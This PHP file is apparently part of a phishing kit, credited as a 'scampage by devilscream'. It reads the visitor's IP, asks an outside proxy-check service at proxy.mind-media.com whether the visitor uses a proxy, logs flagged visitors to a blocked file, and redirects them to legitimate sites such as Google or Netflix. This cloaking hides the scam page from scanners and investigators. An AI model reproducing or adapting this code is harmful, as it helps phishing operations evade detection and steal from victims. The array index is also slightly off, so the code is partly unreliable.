<?php
//scampage by devilscream

$random_id = sha1(rand(0,1000000));
$link = array("http://google.com",
"http://amazon.com",
"http://bing.com",
"http://netflix.com",
"http://apple.com");
$random = rand(0, 5);
$link = $link[$random];
date_default_timezone_set('Asia/Jakarta');
$v_ip = $_SERVER['REMOTE_ADDR'];
$v_date = date("l d F H:i:s");
$fp = fopen("../blocked.txt", "a");

function getUserIPs()
{
    $client  = @$_SERVER['HTTP_CLIENT_IP'];
    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
    $remote  = $_SERVER['REMOTE_ADDR'];

    if(filter_var($client, FILTER_VALIDATE_IP))
    {
        $ip = $client;
    }
    elseif(filter_var($forward, FILTER_VALIDATE_IP))
    {
        $ip = $forward;
    }
    else
    {
        $ip = $remote;
    }

    return $ip;
}

$ip = getUserIPs();
    if($ip == "127.0.0.1") {
    }else{
    	$url = "http://proxy.mind-media.com/block/proxycheck.php?ip=".$ip;
    	$ch = curl_init();  
    	curl_setopt($ch,CURLOPT_URL,$url);
    	curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
    	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    	$resp = curl_exec($ch);
    	curl_close($ch);
    	$result = $resp;
    	if($result == "Y") {
    		fputs($fp, "sbh@cybercrime:~ $v_ip Blocked on $v_date [Proxy Anjng]\r\n");
            fclose($fp);
    		header("location: $link");
            exit();
    	}
    }
?>
